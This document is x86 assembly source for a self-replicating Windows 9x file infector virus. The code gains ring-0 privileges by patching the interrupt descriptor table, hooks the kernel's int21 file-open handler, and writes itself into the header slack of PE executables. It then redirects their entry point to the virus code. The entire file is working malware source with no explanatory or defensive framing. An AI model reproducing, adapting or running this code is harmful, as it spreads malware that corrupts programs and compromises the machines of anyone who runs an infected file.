   kernel_ord0             equ     0BFF713D4h
   kernel_int21            equ     0BFF712B9h

   VxDcall                 macro   VxD, Service
                           db      0CDh
                           db      020h
                           dw      Service
                           dw      VxD
                           endm

   VMMcall                 macro   Service
                           VxDcall VMM, Service
                           endm

   IFSMGR                  equ     0040h
   GetHeap                 equ     000Dh

                           p386
                           model   flat

                           .data

                           dd      ?

                           .code
   start:
                           push    edi
                           sidt    [esp-2]
                           pop     edi
                           fild    qword ptr [edi]
                           call    tsr_getr0proc
   r0proc:                 fistp   qword ptr [edi-8]
                           ;;
                           mov     ebx, kernel_int21+8
                           cmp     [ebx], 0C0000000h-(kernel_int21+8)
                           jg      r0exit
                           push    virtsize
                           fild    qword ptr [esi+vc1-start]
   vc1:                    VxDcall IFSMGR, GetHeap
                           fistp   qword ptr [esi+vc1-start]
                           pop     ecx
                           xchg    edi, eax
                           rep     movsb
                           sub     edi, 4+virtend-hook
                           sub     edi, ebx
                           mov     [ebx], edi
                           ;;
   r0exit:                 iret
   tsr_getr0proc:          pop     eax
                           stosd
                           stosd
                           mov     [edi-6], 0EE000028h
                           xchg    esi, eax
                           sub     esi, r0proc-start
                           int     00h

                           db      68h
   oldeip                  dd      $+5
                           ret

   hook:                   cmp     eax, 716Ch
                           jne     hookexit

   infect:                 pusha

                           mov     bx, 2042h
                           xor     edx, edx
                           push    edx
                           inc     edx
                           push    eax
                           push    002A0010h
                           mov     eax, kernel_ord0
                           call    eax
                           jc      infect_exit
                           xchg    ebx, eax

                           mov     ebp, kernel_int21

                           call    $+5
                           pop     esi
                           sub     esi, $-1-start

                           lea     edx, buf-start[esi]

                           mov     ah, 3Fh
                           xor     ecx, ecx
                           mov     ch, bufsize/256
                           pusha
                           call    ebp
                           mov     ax, 4200h
                           mov     edx, [edx+3Ch]
                           xor     ecx, ecx
                           call    ebp
                           popa
                           call    ebp
                           cmp     eax, ecx
                           jne     infect_close

                           push    edx
                           neg     eax
                           xchg    edx, eax
                           xor     ecx, ecx
                           dec     ecx
                           mov     ax, 4201h
                           call    ebp
                           pop     edx

                           cmp     word ptr [edx], '0Z'
                           jne     infect_close

                           mov     ecx, [edx+54h]  ; pe_headersize
                           lea     edi, [edx+ecx]
                           add     cx, ax
                           xchg    ecx, [edx+28h]  ; entrypointrva
                           add     ecx, [edx+34h]  ; imagebase
                           mov     oldeip-start[esi], ecx

                           xor     ecx, ecx
                           mov     cl, physsize
                           add     [edx+54h], ecx  ; pe_headersize
                           cld
                           cmp     dword ptr [edi+ecx], 0
   ;                       xor     eax, eax
   ;                       pusha
   ;                       repz    scasb
   ;                       popa
                           jne     infect_close
                           rep     movsb

                           mov     ah, 40h
                           mov     ch, bufsize/256
                           call    ebp

   infect_close:           mov     ah, 3Eh
                           call    ebp

   infect_exit:            popa

   hookexit:               push    kernel_ord0
                           ret

   physend:
   physsize                equ     $-start

   bufsize                 equ     4096
   buf                     db      bufsize dup (?)

   virtend:
   virtsize                equ     $-start

                           db      13,10
                           db      '------------------------',13,10

                           db      'physsize = '
                           db      physsize/1000 mod 10+'0'
                           db      physsize/ 100 mod 10+'0'
                           db      physsize/  10 mod 10+'0'
                           db      physsize/   1 mod 10+'0'
                           db      ' bytes',13,10
                           db      'virtsize = '
                           db      virtsize/1000 mod 10+'0'
                           db      virtsize/ 100 mod 10+'0'
                           db      virtsize/  10 mod 10+'0'
                           db      virtsize/   1 mod 10+'0'
                           db      ' bytes',13,10

                           db      '------------------------',13,10
                           db      13,10

                           end     start
